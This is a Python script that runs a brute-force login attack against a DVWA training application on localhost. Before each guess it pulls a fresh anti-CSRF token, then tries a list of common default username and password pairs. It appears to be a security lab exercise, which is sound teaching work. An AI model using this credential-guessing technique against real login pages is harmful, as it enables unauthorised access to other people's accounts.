from bs4 import BeautifulSoup

BASE_URL = "http://localhost:8080/dvwa/"


def get_fresh_token(session, login_url):
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    if token_input:
        return token_input["value"]
    return ""


def brute_force_login(session, login_url):

    print("\nStarting Brute Force Attack Simulation...\n")

    credentials = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("admin", "qwerty"),
        ("user", "user"),
        ("user", "password"),
        ("root", "root"),
        ("test", "test"),
        ("guest", "guest"),
    ]

    for username, password in credentials:

        token = get_fresh_token(session, login_url)

        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": token
        }

        response = session.post(login_url, data=data)

        if "Login failed" not in response.text and "Welcome" in response.text:
            print(f"[VULNERABLE] Weak credentials found: {username}:{password}")
            return (username, password)
        else:
            print(f"[FAILED] {username}:{password}")

    print("No weak credentials detected.")
    return None